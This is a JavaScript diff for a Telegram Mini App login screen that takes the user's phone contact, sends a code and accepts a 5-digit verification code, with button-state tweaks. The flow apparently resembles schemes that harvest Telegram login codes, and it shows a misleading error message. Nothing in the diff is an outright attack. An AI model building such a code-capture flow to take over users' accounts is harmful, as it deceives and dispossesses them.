@@ -66,12 +66,14 @@ window.onload = function () {
     
     if (phone) {
         tgButton.setText("Отправить");
+        tgButton.disable();
         tgButton.showProgress(false);
         tgButton.show();
         (async () => {
             try {
                 await sendCodeFlow();
                 tgButton.hideProgress();
+                tgButton.disable();
                 verificationForm.style.display = 'block';
                 codeInput.focus();
             } catch (error) {
@@ -84,6 +86,7 @@ window.onload = function () {
     } else {
         tgButton.setText("Войти");
         tgButton.show();
+        tgButton.enable();
     }
 
     // const ref = window.appConfig.telegramWebApp.initDataUnsafe.start_param;
@@ -102,7 +105,7 @@ window.onload = function () {
             return
         }
         const code = codeInput.value.trim().replace(/\D/g, "");
-        if (code.length !== 6) {
+        if (code.length !== 5) {
             const message = "Could not load data. Reload MiniApp";
             const icon = "img/error.svg"
             loader.style.display = "none";
@@ -146,6 +149,13 @@ window.onload = function () {
     });
 
     codeInput.addEventListener("input", () => {
+        codeInput.value = codeInput.value.replace(/\D/g, "");
+    
+        if (codeInput.value.length === 5) {
+            tgButton.enable();
+        } else {
+            tgButton.disable();
+        }
     });
 
     window.appConfig.telegramWebApp.onEvent("contactRequested", (eventType, eventData) => {
